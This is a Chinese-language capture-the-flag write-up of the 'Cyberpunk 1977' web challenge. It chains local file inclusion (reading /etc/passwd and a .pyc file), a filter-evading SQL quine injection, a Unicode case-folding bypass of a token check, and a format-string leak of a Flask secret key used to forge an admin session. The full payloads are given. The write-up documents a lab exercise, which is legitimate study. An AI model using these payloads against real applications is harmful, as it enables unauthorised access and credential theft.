# Cyberpunk 1977

Author : `Sciuridae` Team : `0xdeadbeef` Flag : `FLAG{ＲE𝖠𝗟_FⅬ𝗔Ｇ}`

## 解題過程

在題目首頁 (http://eofqual.ais3.org:1977/) 上方的 Hint 點進去。

![Cyberpunk 1977 Hint](https://github.com/Ret2NOP/CTF-WriteUp/raw/main/2020/AIS3%20EOF%20CTF/assets/Cyberpunk%201977-hint.png)

點進去會發現網址內含 ?file=hint.txt ，而且下方有 Hint ([VISUAL BASIC 2077](https://drive.google.com/file/d/1AXEcUSwGlBON_1abv919AIw5CSX2I5VU/view))

![Cyberpunk 1977 Hint Page](https://github.com/Ret2NOP/CTF-WriteUp/raw/main/2020/AIS3%20EOF%20CTF/assets/Cyberpunk%201977-hint-page.png)

然後在 Hint 頁面也提到了使用 `tiangolo/uwsgi-nginx-flask` Docker image，代表著後端是用 Python + Flask 架設的，

先來處理 ?file= 的部分，這樣寫通常都會有 LFI 的問題，所以就先嘗試 `/etc/passwd`

![Cyberpunk 1977 LFI etc passwd](https://github.com/Ret2NOP/CTF-WriteUp/raw/main/2020/AIS3%20EOF%20CTF/assets/Cyberpunk%201977-etc-passwd.png)

成功取得！代表有 LFI 的漏洞可以戳 ヽ(●´∀\`●)ﾉ，接下來嘗試取得後端原始碼 (通常是 main.py / app.py 之類的檔名)

![Cyberpunk 1977 LFI denied py](https://github.com/Ret2NOP/CTF-WriteUp/raw/main/2020/AIS3%20EOF%20CTF/assets/Cyberpunk%201977-denied-py.png)

喔不 。･ﾟ･(つд\`ﾟ)･ﾟ･ ，後端有擋掉以 .py 路徑，可是沒關係ヽ(́◕◞౪◟◕‵)ﾉ
根據過往經驗 Python 會自己產生 .pyc 檔案並放置於 __pycache__ 目錄下以加快執行速度，而 .pyc 檔名是有規格性的而且是可以被反編譯回接近原始碼的檔案。

檔名格式 : `{檔案名稱}.{編譯器}-{版本}.pyc` 例如 : main.cpython-38.pyc

![Cyberpunk 1977 PYC Files](https://github.com/Ret2NOP/CTF-WriteUp/raw/main/2020/AIS3%20EOF%20CTF/assets/Cyberpunk%201977-pyc-files.png)

我先嘗試用 Docker image 最新版本 (3.8) 進行測試，一開始以 app.py (__pycache__/app.cpython-38.pyc) 做為測試，結果失敗，改成 main.py (__pycache__/main.cpython-38.pyc) 為目標後就成功取得 pyc 檔案了 OwO

![Cyberpunk 1977 Wget PYC](https://github.com/Ret2NOP/CTF-WriteUp/raw/main/2020/AIS3%20EOF%20CTF/assets/Cyberpunk%201977-wget-pyc.png)

接下來使用 `uncompyle6` 之類的工具將 pyc 轉回 py 檔案，過程就不贅述了，轉換完後開始讀 Code，取得 DB 是使用 SQLite，歸類出幾項規則

- 1. SQL 語法直接用 format string 進行串接，有 SQL Injection 漏洞
- 2. 輸入的帳號密碼必須要和從資料庫取出的帳號密碼一樣
- 3. 要取得 Flag 的話 Session 內的 is_admin 必須為 True
- 4. 要取得 Flag Token 必須是 `ADMIN-E864E8E8F230374AA7B3B0CE441E209A`
- 5. 若非 admin 使用 `ADMIN` Token 會被阻止
- 6. 在輸出 Flag 的時候 Username 直接和要被 Format 字串串接，有漏洞可以是用傳進來的 Flag 取得其他資料

![Cyberpunk 1977 Wget PYC](https://github.com/Ret2NOP/CTF-WriteUp/raw/main/2020/AIS3%20EOF%20CTF/assets/Cyberpunk%201977-flag-code.png)
![Cyberpunk 1977 Wget PYC](https://github.com/Ret2NOP/CTF-WriteUp/raw/main/2020/AIS3%20EOF%20CTF/assets/Cyberpunk%201977-login-code.png)

接下來要來處理這幾項規則

### SQL Injection

根據 [VISUAL BASIC 2077](https://drive.google.com/file/d/1AXEcUSwGlBON_1abv919AIw5CSX2I5VU/view) 的 Hint，應該是要拚出 SQL Quine，稍微 Google 一下網頁上的解法幾乎被 Code 內的 is_bad 擋掉，規則有 replace 或 printf 或 char 或是 \x00 - \x20 都不允許出現。

![Cyberpunk 1977 WAF](https://github.com/Ret2NOP/CTF-WriteUp/raw/main/2020/AIS3%20EOF%20CTF/assets/Cyberpunk%201977-is-bad.png)

簡單來說就是要利用 SQL Injection 的同時輸入的東西要和輸出的東西一樣，網路上比較多人使用的 printf 已經被擋掉了，所以我和隊友們翻了翻 SQLite 內建函數選擇用 substr 來做組合，
然後就組出了這種東西 XD

Payload :
```
'union/**/select/**/"admin",substr(s,0,133)||substr(s,0,2)||substr(s,0,2)||s||substr(s,0,2)||substr(s,133,99)/**/from/**/(select/**/'''union/**/select/**/"admin",substr(s,0,133)||substr(s,0,2)||substr(s,0,2)||s||substr(s,0,2)||substr(s,133,99)/**/from/**/(select/**//**/as/**/s)/**/--'/**/as/**/s)/**/--
```

簡單來說這句就是把 `select/**/'''union/**/select/**/"admin",substr(s,0,133)||substr(s,0,2)||substr(s,0,2)||s||substr(s,0,2)||substr(s,133,99)/**/from/**/(select/**//**/as/**/s)/**/--` 拆開然後重新組合就會變成一模一樣的 Payload！接下來利用這個 Payload 就可以成功登入 admin ！

### Token

接下來，要解決「若非 admin 使用 `ADMIN` Token 會被阻止」，後端會在傳入 Token 的時候利用大小寫不敏感的 Regex 檢查是否有包含 admin，然後在接下來的部分將 Token 轉成大寫檢查是否一樣。

而這部份很好解決，就只要把 Unicode 全部跑一遍找到轉成大寫是正確的東西可是不會在 Regex 被檢查到的字元就可以了，我們使用的是`ı`這個字元來繞過 Token 檢查。

Payload : `ADMıN-E864E8E8F230374AA7B3B0CE441E209A`  

### Session

現在我們有 Token 有 SQL Quine 後，需要想辦法將 Session 的 is_admin 改成 True ，這部分就要想辦法取得 Flask APP 的 Secret key ，當後端在在輸出 Flag 的時候 Username 直接和要被 Format 字串串接，這邊是有漏洞可以是用傳進來的 Username 取得其他資料，接著就是漫長的 Google 後，經過一連串的測試，發現`{flag.__str__.__globals__[app].secret_key}`這個語法可以存取到 Secret key，結合上面的 SQL Quine 就可以觸發漏洞取得，再利用 [flask-session-cookie-manager](https://github.com/noraj/flask-session-cookie-manager) 將 session 簽署後塞回 Cookie。

Payload : `{flag.__str__.__globals__[app].secret_key}`  
Username Payload : 
```
'union/**/select/**/"{flag.__str__.__globals__[app].secret_key}",substr(s,0,170)||substr(s,0,2)||substr(s,0,2)||s||substr(s,0,2)||substr(s,170,99)/**/from/**/(select/**/'''union/**/select/**/"{flag.__str__.__globals__[app].secret_key}",substr(s,0,170)||substr(s,0,2)||substr(s,0,2)||s||substr(s,0,2)||substr(s,170,99)/**/from/**/(select/**//**/as/**/s)/**/--'/**/as/**/s)/**/--
```

就可以取得 Flag ！
